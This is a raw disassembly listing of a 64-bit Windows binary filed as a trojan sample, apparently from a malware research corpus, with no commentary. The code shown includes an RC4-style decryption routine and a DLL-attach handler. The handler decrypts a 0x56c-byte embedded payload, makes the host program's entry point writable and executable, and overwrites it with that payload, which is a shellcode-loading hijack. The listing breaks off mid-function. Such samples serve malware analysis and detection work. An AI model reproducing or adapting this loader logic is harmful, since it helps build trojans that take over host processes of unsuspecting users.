
malware_samples/trojan/3ca095e11e3905086ba37583ba0bcf56b515266e1a5a2489de9498d156dd7c6e.exe:     file format pei-x86-64


Disassembly of section .text:

0000000180001000 <.text>:
   180001000:	48 8d 05 51 3c 00 00 	lea    0x3c51(%rip),%rax        # 0x180004c58
   180001007:	c3                   	ret
   180001008:	c2 00 00             	ret    $0x0
   18000100b:	cc                   	int3
   18000100c:	4c 8b dc             	mov    %rsp,%r11
   18000100f:	49 89 5b 10          	mov    %rbx,0x10(%r11)
   180001013:	49 89 6b 18          	mov    %rbp,0x18(%r11)
   180001017:	49 89 73 20          	mov    %rsi,0x20(%r11)
   18000101b:	57                   	push   %rdi
   18000101c:	48 81 ec 30 02 00 00 	sub    $0x230,%rsp
   180001023:	48 8b 05 d6 2f 00 00 	mov    0x2fd6(%rip),%rax        # 0x180004000
   18000102a:	48 33 c4             	xor    %rsp,%rax
   18000102d:	48 89 84 24 20 02 00 	mov    %rax,0x220(%rsp)
   180001034:	00 
   180001035:	48 8b e9             	mov    %rcx,%rbp
   180001038:	be 00 01 00 00       	mov    $0x100,%esi
   18000103d:	33 ff                	xor    %edi,%edi
   18000103f:	49 8d 8b e8 fe ff ff 	lea    -0x118(%r11),%rcx
   180001046:	44 8b c6             	mov    %esi,%r8d
   180001049:	33 d2                	xor    %edx,%edx
   18000104b:	8b df                	mov    %edi,%ebx
   18000104d:	e8 5a 0e 00 00       	call   0x180001eac
   180001052:	44 8b c6             	mov    %esi,%r8d
   180001055:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   18000105a:	33 d2                	xor    %edx,%edx
   18000105c:	e8 4b 0e 00 00       	call   0x180001eac
   180001061:	8b cf                	mov    %edi,%ecx
   180001063:	44 8d 5f 01          	lea    0x1(%rdi),%r11d
   180001067:	8b d7                	mov    %edi,%edx
   180001069:	8b c1                	mov    %ecx,%eax
   18000106b:	88 4c 14 20          	mov    %cl,0x20(%rsp,%rdx,1)
   18000106f:	83 e0 7f             	and    $0x7f,%eax
   180001072:	4c 8d 05 07 30 00 00 	lea    0x3007(%rip),%r8        # 0x180004080
   180001079:	41 03 cb             	add    %r11d,%ecx
   18000107c:	42 8a 04 00          	mov    (%rax,%r8,1),%al
   180001080:	88 84 14 20 01 00 00 	mov    %al,0x120(%rsp,%rdx,1)
   180001087:	49 03 d3             	add    %r11,%rdx
   18000108a:	3b ce                	cmp    %esi,%ecx
   18000108c:	7c db                	jl     0x180001069
   18000108e:	48 8b d7             	mov    %rdi,%rdx
   180001091:	0f b6 84 14 20 01 00 	movzbl 0x120(%rsp,%rdx,1),%eax
   180001098:	00 
   180001099:	44 0f b6 44 14 20    	movzbl 0x20(%rsp,%rdx,1),%r8d
   18000109f:	03 d8                	add    %eax,%ebx
   1800010a1:	41 03 d8             	add    %r8d,%ebx
   1800010a4:	81 e3 ff 00 00 80    	and    $0x800000ff,%ebx
   1800010aa:	7d 0c                	jge    0x1800010b8
   1800010ac:	41 2b db             	sub    %r11d,%ebx
   1800010af:	81 cb 00 ff ff ff    	or     $0xffffff00,%ebx
   1800010b5:	41 03 db             	add    %r11d,%ebx
   1800010b8:	48 63 cb             	movslq %ebx,%rcx
   1800010bb:	8a 44 0c 20          	mov    0x20(%rsp,%rcx,1),%al
   1800010bf:	88 44 14 20          	mov    %al,0x20(%rsp,%rdx,1)
   1800010c3:	49 03 d3             	add    %r11,%rdx
   1800010c6:	44 88 44 0c 20       	mov    %r8b,0x20(%rsp,%rcx,1)
   1800010cb:	49 2b f3             	sub    %r11,%rsi
   1800010ce:	75 c1                	jne    0x180001091
   1800010d0:	8b d7                	mov    %edi,%edx
   1800010d2:	41 ba 6c 05 00 00    	mov    $0x56c,%r10d
   1800010d8:	8d 47 01             	lea    0x1(%rdi),%eax
   1800010db:	25 ff 00 00 80       	and    $0x800000ff,%eax
   1800010e0:	7d 0b                	jge    0x1800010ed
   1800010e2:	41 2b c3             	sub    %r11d,%eax
   1800010e5:	0d 00 ff ff ff       	or     $0xffffff00,%eax
   1800010ea:	41 03 c3             	add    %r11d,%eax
   1800010ed:	48 63 f8             	movslq %eax,%rdi
   1800010f0:	44 0f b6 4c 3c 20    	movzbl 0x20(%rsp,%rdi,1),%r9d
   1800010f6:	41 03 d1             	add    %r9d,%edx
   1800010f9:	81 e2 ff 00 00 80    	and    $0x800000ff,%edx
   1800010ff:	7d 0c                	jge    0x18000110d
   180001101:	41 2b d3             	sub    %r11d,%edx
   180001104:	81 ca 00 ff ff ff    	or     $0xffffff00,%edx
   18000110a:	41 03 d3             	add    %r11d,%edx
   18000110d:	48 63 ca             	movslq %edx,%rcx
   180001110:	8a 44 0c 20          	mov    0x20(%rsp,%rcx,1),%al
   180001114:	88 44 3c 20          	mov    %al,0x20(%rsp,%rdi,1)
   180001118:	44 88 4c 0c 20       	mov    %r9b,0x20(%rsp,%rcx,1)
   18000111d:	0f b6 4c 3c 20       	movzbl 0x20(%rsp,%rdi,1),%ecx
   180001122:	49 03 c9             	add    %r9,%rcx
   180001125:	0f b6 c1             	movzbl %cl,%eax
   180001128:	8a 4c 04 20          	mov    0x20(%rsp,%rax,1),%cl
   18000112c:	30 4d 00             	xor    %cl,0x0(%rbp)
   18000112f:	49 03 eb             	add    %r11,%rbp
   180001132:	4d 2b d3             	sub    %r11,%r10
   180001135:	75 a1                	jne    0x1800010d8
   180001137:	48 8b 8c 24 20 02 00 	mov    0x220(%rsp),%rcx
   18000113e:	00 
   18000113f:	48 33 cc             	xor    %rsp,%rcx
   180001142:	e8 c9 00 00 00       	call   0x180001210
   180001147:	4c 8d 9c 24 30 02 00 	lea    0x230(%rsp),%r11
   18000114e:	00 
   18000114f:	49 8b 5b 18          	mov    0x18(%r11),%rbx
   180001153:	49 8b 6b 20          	mov    0x20(%r11),%rbp
   180001157:	49 8b 73 28          	mov    0x28(%r11),%rsi
   18000115b:	49 8b e3             	mov    %r11,%rsp
   18000115e:	5f                   	pop    %rdi
   18000115f:	c3                   	ret
   180001160:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180001165:	57                   	push   %rdi
   180001166:	48 83 ec 30          	sub    $0x30,%rsp
   18000116a:	48 8b 05 8f 2e 00 00 	mov    0x2e8f(%rip),%rax        # 0x180004000
   180001171:	48 33 c4             	xor    %rsp,%rax
   180001174:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   180001179:	33 db                	xor    %ebx,%ebx
   18000117b:	85 d2                	test   %edx,%edx
   18000117d:	74 5e                	je     0x1800011dd
   18000117f:	83 fa 01             	cmp    $0x1,%edx
   180001182:	75 59                	jne    0x1800011dd
   180001184:	ff 15 86 1e 00 00    	call   *0x1e86(%rip)        # 0x180003010
   18000118a:	48 8d 0d 6f 2f 00 00 	lea    0x2f6f(%rip),%rcx        # 0x180004100
   180001191:	e8 76 fe ff ff       	call   0x18000100c
   180001196:	33 c9                	xor    %ecx,%ecx
   180001198:	ff 15 7a 1e 00 00    	call   *0x1e7a(%rip)        # 0x180003018
   18000119e:	48 8b d0             	mov    %rax,%rdx
   1800011a1:	4c 8d 4c 24 20       	lea    0x20(%rsp),%r9
   1800011a6:	44 8d 43 40          	lea    0x40(%rbx),%r8d
   1800011aa:	48 63 40 3c          	movslq 0x3c(%rax),%rax
   1800011ae:	8b 4c 10 28          	mov    0x28(%rax,%rdx,1),%ecx
   1800011b2:	03 ca                	add    %edx,%ecx
   1800011b4:	ba 6c 05 00 00       	mov    $0x56c,%edx
   1800011b9:	8b f9                	mov    %ecx,%edi
   1800011bb:	ff 15 3f 1e 00 00    	call   *0x1e3f(%rip)        # 0x180003000
   1800011c1:	8b d3                	mov    %ebx,%edx
   1800011c3:	48 8d 0d 36 2f 00 00 	lea    0x2f36(%rip),%rcx        # 0x180004100
   1800011ca:	ff c3                	inc    %ebx
   1800011cc:	8a 0c 0a             	mov    (%rdx,%rcx,1),%cl
   1800011cf:	88 0c 17             	mov    %cl,(%rdi,%rdx,1)
   1800011d2:	48 ff c2             	inc    %rdx
   1800011d5:	81 fb 6c 05 00 00    	cmp    $0x56c,%ebx
   1800011db:	72 e6                	jb     0x1800011c3
   1800011dd:	b8 01 00 00 00       	mov    $0x1,%eax
   1800011e2:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   1800011e7:	48 33 cc             	xor    %rsp,%rcx
   1800011ea:	e8 21 00 00 00       	call   0x180001210
   1800011ef:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   1800011f4:	48 83 c4 30          	add    $0x30,%rsp
   1800011f8:	5f                   	pop    %rdi
   1800011f9:	c3                   	ret
   1800011fa:	cc                   	int3
   1800011fb:	cc                   	int3
   1800011fc:	cc                   	int3
   1800011fd:	cc                   	int3
   1800011fe:	cc                   	int3
   1800011ff:	cc                   	int3
   180001200:	cc                   	int3
   180001201:	cc                   	int3
   180001202:	cc                   	int3
   180001203:	cc                   	int3
   180001204:	cc                   	int3
   180001205:	cc                   	int3
   180001206:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   18000120d:	00 00 00 
   180001210:	48 3b 0d e9 2d 00 00 	cmp    0x2de9(%rip),%rcx        # 0x180004000
   180001217:	75 10                	jne    0x180001229
   180001219:	48 c1 c1 10          	rol    $0x10,%rcx
   18000121d:	66 f7 c1 ff ff       	test   $0xffff,%cx
   180001222:	75 01                	jne    0x180001225
   180001224:	c3                   	ret
   180001225:	48 c1 c9 10          	ror    $0x10,%rcx
   180001229:	e9 92 03 00 00       	jmp    0x1800015c0
   18000122e:	cc                   	int3
   18000122f:	cc                   	int3
   180001230:	48 83 ec 28          	sub    $0x28,%rsp
   180001234:	85 d2                	test   %edx,%edx
   180001236:	74 39                	je     0x180001271
   180001238:	83 ea 01             	sub    $0x1,%edx
   18000123b:	74 28                	je     0x180001265
   18000123d:	83 ea 01             	sub    $0x1,%edx
   180001240:	74 16                	je     0x180001258
   180001242:	83 fa 01             	cmp    $0x1,%edx
   180001245:	74 0a                	je     0x180001251
   180001247:	b8 01 00 00 00       	mov    $0x1,%eax
   18000124c:	48 83 c4 28          	add    $0x28,%rsp
   180001250:	c3                   	ret
   180001251:	e8 4e 06 00 00       	call   0x1800018a4
   180001256:	eb 05                	jmp    0x18000125d
   180001258:	e8 1f 06 00 00       	call   0x18000187c
   18000125d:	0f b6 c0             	movzbl %al,%eax
   180001260:	48 83 c4 28          	add    $0x28,%rsp
   180001264:	c3                   	ret
   180001265:	49 8b d0             	mov    %r8,%rdx
   180001268:	48 83 c4 28          	add    $0x28,%rsp
   18000126c:	e9 0f 00 00 00       	jmp    0x180001280
   180001271:	4d 85 c0             	test   %r8,%r8
   180001274:	0f 95 c1             	setne  %cl
   180001277:	48 83 c4 28          	add    $0x28,%rsp
   18000127b:	e9 18 01 00 00       	jmp    0x180001398
   180001280:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180001285:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   18000128a:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   18000128f:	41 56                	push   %r14
   180001291:	48 83 ec 20          	sub    $0x20,%rsp
   180001295:	48 8b f2             	mov    %rdx,%rsi
   180001298:	4c 8b f1             	mov    %rcx,%r14
   18000129b:	33 c9                	xor    %ecx,%ecx
   18000129d:	e8 be 06 00 00       	call   0x180001960
   1800012a2:	84 c0                	test   %al,%al
   1800012a4:	0f 84 c8 00 00 00    	je     0x180001372
   1800012aa:	e8 45 05 00 00       	call   0x1800017f4
   1800012af:	8a d8                	mov    %al,%bl
   1800012b1:	88 44 24 40          	mov    %al,0x40(%rsp)
   1800012b5:	40 b7 01             	mov    $0x1,%dil
   1800012b8:	83 3d 49 39 00 00 00 	cmpl   $0x0,0x3949(%rip)        # 0x180004c08
   1800012bf:	0f 85 c5 00 00 00    	jne    0x18000138a
   1800012c5:	c7 05 39 39 00 00 01 	movl   $0x1,0x3939(%rip)        # 0x180004c08
   1800012cc:	00 00 00 
   1800012cf:	e8 90 05 00 00       	call   0x180001864
   1800012d4:	84 c0                	test   %al,%al
   1800012d6:	74 4f                	je     0x180001327
   1800012d8:	e8 8b 09 00 00       	call   0x180001c68
   1800012dd:	e8 d2 04 00 00       	call   0x1800017b4
   1800012e2:	e8 f1 04 00 00       	call   0x1800017d8
   1800012e7:	48 8d 15 62 1e 00 00 	lea    0x1e62(%rip),%rdx        # 0x180003150
   1800012ee:	48 8d 0d 53 1e 00 00 	lea    0x1e53(%rip),%rcx        # 0x180003148
   1800012f5:	e8 be 0b 00 00       	call   0x180001eb8
   1800012fa:	85 c0                	test   %eax,%eax
   1800012fc:	75 29                	jne    0x180001327
   1800012fe:	e8 2d 05 00 00       	call   0x180001830
   180001303:	84 c0                	test   %al,%al
   180001305:	74 20                	je     0x180001327
   180001307:	48 8d 15 32 1e 00 00 	lea    0x1e32(%rip),%rdx        # 0x180003140
   18000130e:	48 8d 0d 23 1e 00 00 	lea    0x1e23(%rip),%rcx        # 0x180003138
   180001315:	e8 98 0b 00 00       	call   0x180001eb2
   18000131a:	c7 05 e4 38 00 00 02 	movl   $0x2,0x38e4(%rip)        # 0x180004c08
   180001321:	00 00 00 
   180001324:	40 32 ff             	xor    %dil,%dil
   180001327:	8a cb                	mov    %bl,%cl
   180001329:	e8 92 07 00 00       	call   0x180001ac0
   18000132e:	40 84 ff             	test   %dil,%dil
   180001331:	75 3f                	jne    0x180001372
   180001333:	e8 d8 07 00 00       	call   0x180001b10
   180001338:	48 8b d8             	mov    %rax,%rbx
   18000133b:	48 83 38 00          	cmpq   $0x0,(%rax)
   18000133f:	74 24                	je     0x180001365
   180001341:	48 8b c8             	mov    %rax,%rcx
   180001344:	e8 df 06 00 00       	call   0x180001a28
   180001349:	84 c0                	test   %al,%al
   18000134b:	74 18                	je     0x180001365
   18000134d:	4c 8b c6             	mov    %rsi,%r8
   180001350:	ba 02 00 00 00       	mov    $0x2,%edx
   180001355:	49 8b ce             	mov    %r14,%rcx
   180001358:	48 8b 03             	mov    (%rbx),%rax
   18000135b:	4c 8b 0d ae 1d 00 00 	mov    0x1dae(%rip),%r9        # 0x180003110
   180001362:	41 ff d1             	call   *%r9
   180001365:	ff 05 05 33 00 00    	incl   0x3305(%rip)        # 0x180004670
   18000136b:	b8 01 00 00 00       	mov    $0x1,%eax
   180001370:	eb 02                	jmp    0x180001374
   180001372:	33 c0                	xor    %eax,%eax
   180001374:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180001379:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   18000137e:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   180001383:	48 83 c4 20          	add    $0x20,%rsp
   180001387:	41 5e                	pop    %r14
   180001389:	c3                   	ret
   18000138a:	b9 07 00 00 00       	mov    $0x7,%ecx
   18000138f:	e8 8c 07 00 00       	call   0x180001b20
   180001394:	90                   	nop
   180001395:	cc                   	int3
   180001396:	cc                   	int3
   180001397:	cc                   	int3
   180001398:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000139d:	57                   	push   %rdi
   18000139e:	48 83 ec 30          	sub    $0x30,%rsp
   1800013a2:	40 8a f9             	mov    %cl,%dil
   1800013a5:	8b 05 c5 32 00 00    	mov    0x32c5(%rip),%eax        # 0x180004670
   1800013ab:	85 c0                	test   %eax,%eax
   1800013ad:	7f 0d                	jg     0x1800013bc
   1800013af:	33 c0                	xor    %eax,%eax
   1800013b1:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   1800013b6:	48 83 c4 30          	add    $0x30,%rsp
   1800013ba:	5f                   	pop    %rdi
   1800013bb:	c3                   	ret
   1800013bc:	ff c8                	dec    %eax
   1800013be:	89 05 ac 32 00 00    	mov    %eax,0x32ac(%rip)        # 0x180004670
   1800013c4:	e8 2b 04 00 00       	call   0x1800017f4
   1800013c9:	8a d8                	mov    %al,%bl
   1800013cb:	88 44 24 20          	mov    %al,0x20(%rsp)
   1800013cf:	83 3d 32 38 00 00 02 	cmpl   $0x2,0x3832(%rip)        # 0x180004c08
   1800013d6:	75 33                	jne    0x18000140b
   1800013d8:	e8 3f 05 00 00       	call   0x18000191c
   1800013dd:	e8 e2 03 00 00       	call   0x1800017c4
   1800013e2:	e8 bd 08 00 00       	call   0x180001ca4
   1800013e7:	83 25 1a 38 00 00 00 	andl   $0x0,0x381a(%rip)        # 0x180004c08
   1800013ee:	8a cb                	mov    %bl,%cl
   1800013f0:	e8 cb 06 00 00       	call   0x180001ac0
   1800013f5:	33 d2                	xor    %edx,%edx
   1800013f7:	40 8a cf             	mov    %dil,%cl
   1800013fa:	e8 e5 06 00 00       	call   0x180001ae4
   1800013ff:	0f b6 d8             	movzbl %al,%ebx
   180001402:	e8 45 05 00 00       	call   0x18000194c
   180001407:	8b c3                	mov    %ebx,%eax
   180001409:	eb a6                	jmp    0x1800013b1
   18000140b:	b9 07 00 00 00       	mov    $0x7,%ecx
   180001410:	e8 0b 07 00 00       	call   0x180001b20
   180001415:	90                   	nop
   180001416:	90                   	nop
   180001417:	cc                   	int3
   180001418:	48 8b c4             	mov    %rsp,%rax
   18000141b:	48 89 58 20          	mov    %rbx,0x20(%rax)
   18000141f:	4c 89 40 18          	mov    %r8,0x18(%rax)
   180001423:	89 50 10             	mov    %edx,0x10(%rax)
   180001426:	48 89 48 08          	mov    %rcx,0x8(%rax)
   18000142a:	56                   	push   %rsi
   18000142b:	57                   	push   %rdi
   18000142c:	41 56                	push   %r14
   18000142e:	48 83 ec 40          	sub    $0x40,%rsp
   180001432:	49 8b f0             	mov    %r8,%rsi
   180001435:	8b fa                	mov    %edx,%edi
   180001437:	4c 8b f1             	mov    %rcx,%r14
   18000143a:	85 d2                	test   %edx,%edx
   18000143c:	75 0f                	jne    0x18000144d
   18000143e:	39 15 2c 32 00 00    	cmp    %edx,0x322c(%rip)        # 0x180004670
   180001444:	7f 07                	jg     0x18000144d
   180001446:	33 c0                	xor    %eax,%eax
   180001448:	e9 ee 00 00 00       	jmp    0x18000153b
   18000144d:	8d 42 ff             	lea    -0x1(%rdx),%eax
   180001450:	83 f8 01             	cmp    $0x1,%eax
   180001453:	77 45                	ja     0x18000149a
   180001455:	48 8b 05 24 1d 00 00 	mov    0x1d24(%rip),%rax        # 0x180003180
   18000145c:	48 85 c0             	test   %rax,%rax
   18000145f:	75 0a                	jne    0x18000146b
   180001461:	c7 44 24 30 01 00 00 	movl   $0x1,0x30(%rsp)
   180001468:	00 
   180001469:	eb 14                	jmp    0x18000147f
   18000146b:	ff 15 9f 1c 00 00    	call   *0x1c9f(%rip)        # 0x180003110
   180001471:	8b d8                	mov    %eax,%ebx
   180001473:	89 44 24 30          	mov    %eax,0x30(%rsp)
   180001477:	85 c0                	test   %eax,%eax
   180001479:	0f 84 b2 00 00 00    	je     0x180001531
   18000147f:	4c 8b c6             	mov    %rsi,%r8
   180001482:	8b d7                	mov    %edi,%edx
   180001484:	49 8b ce             	mov    %r14,%rcx
   180001487:	e8 a4 fd ff ff       	call   0x180001230
   18000148c:	8b d8                	mov    %eax,%ebx
   18000148e:	89 44 24 30          	mov    %eax,0x30(%rsp)
   180001492:	85 c0                	test   %eax,%eax
   180001494:	0f 84 97 00 00 00    	je     0x180001531
   18000149a:	4c 8b c6             	mov    %rsi,%r8
   18000149d:	8b d7                	mov    %edi,%edx
   18000149f:	49 8b ce             	mov    %r14,%rcx
   1800014a2:	e8 b9 fc ff ff       	call   0x180001160
   1800014a7:	8b d8                	mov    %eax,%ebx
   1800014a9:	89 44 24 30          	mov    %eax,0x30(%rsp)
   1800014ad:	83 ff 01             	cmp    $0x1,%edi
   1800014b0:	75 36                	jne    0x1800014e8
   1800014b2:	85 c0                	test   %eax,%eax
   1800014b4:	75 32                	jne    0x1800014e8
   1800014b6:	4c 8b c6             	mov    %rsi,%r8
   1800014b9:	33 d2                	xor    %edx,%edx
   1800014bb:	49 8b ce             	mov    %r14,%rcx
   1800014be:	e8 9d fc ff ff       	call   0x180001160
   1800014c3:	48 85 f6             	test   %rsi,%rsi
   1800014c6:	0f 95 c1             	setne  %cl
   1800014c9:	e8 ca fe ff ff       	call   0x180001398
   1800014ce:	48 8b 05 ab 1c 00 00 	mov    0x1cab(%rip),%rax        # 0x180003180
   1800014d5:	48 85 c0             	test   %rax,%rax
   1800014d8:	74 0e                	je     0x1800014e8
   1800014da:	4c 8b c6             	mov    %rsi,%r8
   1800014dd:	33 d2                	xor    %edx,%edx
   1800014df:	49 8b ce             	mov    %r14,%rcx
   1800014e2:	ff 15 28 1c 00 00    	call   *0x1c28(%rip)        # 0x180003110
   1800014e8:	85 ff                	test   %edi,%edi
   1800014ea:	74 05                	je     0x1800014f1
   1800014ec:	83 ff 03             	cmp    $0x3,%edi
   1800014ef:	75 40                	jne    0x180001531
   1800014f1:	4c 8b c6             	mov    %rsi,%r8
   1800014f4:	8b d7                	mov    %edi,%edx
   1800014f6:	49 8b ce             	mov    %r14,%rcx
   1800014f9:	e8 32 fd ff ff       	call   0x180001230
   1800014fe:	8b d8                	mov    %eax,%ebx
   180001500:	89 44 24 30          	mov    %eax,0x30(%rsp)
   180001504:	85 c0                	test   %eax,%eax
   180001506:	74 29                	je     0x180001531
   180001508:	48 8b 05 71 1c 00 00 	mov    0x1c71(%rip),%rax        # 0x180003180
   18000150f:	48 85 c0             	test   %rax,%rax
   180001512:	75 09                	jne    0x18000151d
   180001514:	8d 58 01             	lea    0x1(%rax),%ebx
   180001517:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   18000151b:	eb 14                	jmp    0x180001531
   18000151d:	4c 8b c6             	mov    %rsi,%r8
   180001520:	8b d7                	mov    %edi,%edx
   180001522:	49 8b ce             	mov    %r14,%rcx
   180001525:	ff 15 e5 1b 00 00    	call   *0x1be5(%rip)        # 0x180003110
   18000152b:	8b d8                	mov    %eax,%ebx
   18000152d:	89 44 24 30          	mov    %eax,0x30(%rsp)
   180001531:	eb 06                	jmp    0x180001539
   180001533:	33 db                	xor    %ebx,%ebx
   180001535:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   180001539:	8b c3                	mov    %ebx,%eax
   18000153b:	48 8b 5c 24 78       	mov    0x78(%rsp),%rbx
   180001540:	48 83 c4 40          	add    $0x40,%rsp
   180001544:	41 5e                	pop    %r14
   180001546:	5f                   	pop    %rdi
   180001547:	5e                   	pop    %rsi
   180001548:	c3                   	ret
   180001549:	cc                   	int3
   18000154a:	cc                   	int3
   18000154b:	cc                   	int3
   18000154c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180001551:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   180001556:	57                   	push   %rdi
   180001557:	48 83 ec 20          	sub    $0x20,%rsp
   18000155b:	49 8b f8             	mov    %r8,%rdi
   18000155e:	8b da                	mov    %edx,%ebx
   180001560:	48 8b f1             	mov    %rcx,%rsi
   180001563:	83 fa 01             	cmp    $0x1,%edx
   180001566:	75 05                	jne    0x18000156d
   180001568:	e8 9b 01 00 00       	call   0x180001708
   18000156d:	4c 8b c7             	mov    %rdi,%r8
   180001570:	8b d3                	mov    %ebx,%edx
   180001572:	48 8b ce             	mov    %rsi,%rcx
   180001575:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000157a:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   18000157f:	48 83 c4 20          	add    $0x20,%rsp
   180001583:	5f                   	pop    %rdi
   180001584:	e9 8f fe ff ff       	jmp    0x180001418
   180001589:	cc                   	int3
   18000158a:	cc                   	int3
   18000158b:	cc                   	int3
   18000158c:	40 53                	rex push %rbx
   18000158e:	48 83 ec 20          	sub    $0x20,%rsp
   180001592:	48 8b d9             	mov    %rcx,%rbx
   180001595:	33 c9                	xor    %ecx,%ecx
   180001597:	ff 15 9b 1a 00 00    	call   *0x1a9b(%rip)        # 0x180003038
   18000159d:	48 8b cb             	mov    %rbx,%rcx
   1800015a0:	ff 15 8a 1a 00 00    	call   *0x1a8a(%rip)        # 0x180003030
   1800015a6:	ff 15 5c 1a 00 00    	call   *0x1a5c(%rip)        # 0x180003008
   1800015ac:	48 8b c8             	mov    %rax,%rcx
   1800015af:	ba 09 04 00 c0       	mov    $0xc0000409,%edx
   1800015b4:	48 83 c4 20          	add    $0x20,%rsp
   1800015b8:	5b                   	pop    %rbx
   1800015b9:	48 ff 25 80 1a 00 00 	rex.W jmp *0x1a80(%rip)        # 0x180003040
   1800015c0:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   1800015c5:	48 83 ec 38          	sub    $0x38,%rsp
   1800015c9:	b9 17 00 00 00       	mov    $0x17,%ecx
   1800015ce:	ff 15 74 1a 00 00    	call   *0x1a74(%rip)        # 0x180003048
   1800015d4:	85 c0                	test   %eax,%eax
   1800015d6:	74 07                	je     0x1800015df
   1800015d8:	b9 02 00 00 00       	mov    $0x2,%ecx
   1800015dd:	cd 29                	int    $0x29
   1800015df:	48 8d 0d 3a 31 00 00 	lea    0x313a(%rip),%rcx        # 0x180004720
   1800015e6:	e8 a9 00 00 00       	call   0x180001694
   1800015eb:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   1800015f0:	48 89 05 21 32 00 00 	mov    %rax,0x3221(%rip)        # 0x180004818
   1800015f7:	48 8d 44 24 38       	lea    0x38(%rsp),%rax
   1800015fc:	48 83 c0 08          	add    $0x8,%rax
   180001600:	48 89 05 b1 31 00 00 	mov    %rax,0x31b1(%rip)        # 0x1800047b8
   180001607:	48 8b 05 0a 32 00 00 	mov    0x320a(%rip),%rax        # 0x180004818
   18000160e:	48 89 05 7b 30 00 00 	mov    %rax,0x307b(%rip)        # 0x180004690
   180001615:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   18000161a:	48 89 05 7f 31 00 00 	mov    %rax,0x317f(%rip)        # 0x1800047a0
   180001621:	c7 05 55 30 00 00 09 	movl   $0xc0000409,0x3055(%rip)        # 0x180004680
   180001628:	04 00 c0 
   18000162b:	c7 05 4f 30 00 00 01 	movl   $0x1,0x304f(%rip)        # 0x180004684
   180001632:	00 00 00 
   180001635:	c7 05 59 30 00 00 01 	movl   $0x1,0x3059(%rip)        # 0x180004698
   18000163c:	00 00 00 
   18000163f:	b8 08 00 00 00       	mov    $0x8,%eax
   180001644:	48 6b c0 00          	imul   $0x0,%rax,%rax
   180001648:	48 8d 0d 51 30 00 00 	lea    0x3051(%rip),%rcx        # 0x1800046a0
   18000164f:	48 c7 04 01 02 00 00 	movq   $0x2,(%rcx,%rax,1)
   180001656:	00 
   180001657:	b8 08 00 00 00       	mov    $0x8,%eax
   18000165c:	48 6b c0 00          	imul   $0x0,%rax,%rax
   180001660:	48 8b 0d 99 29 00 00 	mov    0x2999(%rip),%rcx        # 0x180004000
   180001667:	48 89 4c 04 20       	mov    %rcx,0x20(%rsp,%rax,1)
   18000166c:	b8 08 00 00 00       	mov    $0x8,%eax
   180001671:	48 6b c0 01          	imul   $0x1,%rax,%rax
   180001675:	48 8b 0d c4 29 00 00 	mov    0x29c4(%rip),%rcx        # 0x180004040
   18000167c:	48 89 4c 04 20       	mov    %rcx,0x20(%rsp,%rax,1)
   180001681:	48 8d 0d 00 1b 00 00 	lea    0x1b00(%rip),%rcx        # 0x180003188
   180001688:	e8 ff fe ff ff       	call   0x18000158c
   18000168d:	48 83 c4 38          	add    $0x38,%rsp
   180001691:	c3                   	ret
   180001692:	cc                   	int3
   180001693:	cc                   	int3
   180001694:	40 53                	rex push %rbx
   180001696:	56                   	push   %rsi
   180001697:	57                   	push   %rdi
   180001698:	48 83 ec 40          	sub    $0x40,%rsp
   18000169c:	48 8b d9             	mov    %rcx,%rbx
   18000169f:	ff 15 c3 19 00 00    	call   *0x19c3(%rip)        # 0x180003068
   1800016a5:	48 8b b3 f8 00 00 00 	mov    0xf8(%rbx),%rsi
   1800016ac:	33 ff                	xor    %edi,%edi
   1800016ae:	45 33 c0             	xor    %r8d,%r8d
   1800016b1:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   1800016b6:	48 8b ce             	mov    %rsi,%rcx
   1800016b9:	ff 15 61 19 00 00    	call   *0x1961(%rip)        # 0x180003020
   1800016bf:	48 85 c0             	test   %rax,%rax
   1800016c2:	74 39                	je     0x1800016fd
   1800016c4:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   1800016ca:	48 8d 4c 24 68       	lea    0x68(%rsp),%rcx
   1800016cf:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   1800016d4:	4c 8b c8             	mov    %rax,%r9
   1800016d7:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   1800016dc:	4c 8b c6             	mov    %rsi,%r8
   1800016df:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   1800016e4:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   1800016e9:	33 c9                	xor    %ecx,%ecx
   1800016eb:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1800016f0:	ff 15 32 19 00 00    	call   *0x1932(%rip)        # 0x180003028
   1800016f6:	ff c7                	inc    %edi
   1800016f8:	83 ff 02             	cmp    $0x2,%edi
   1800016fb:	7c b1                	jl     0x1800016ae
   1800016fd:	48 83 c4 40          	add    $0x40,%rsp
   180001701:	5f                   	pop    %rdi
   180001702:	5e                   	pop    %rsi
   180001703:	5b                   	pop    %rbx
   180001704:	c3                   	ret
   180001705:	cc                   	int3
   180001706:	cc                   	int3
   180001707:	cc                   	int3
   180001708:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   18000170d:	55                   	push   %rbp
   18000170e:	48 8b ec             	mov    %rsp,%rbp
   180001711:	48 83 ec 30          	sub    $0x30,%rsp
   180001715:	48 8b 05 e4 28 00 00 	mov    0x28e4(%rip),%rax        # 0x180004000
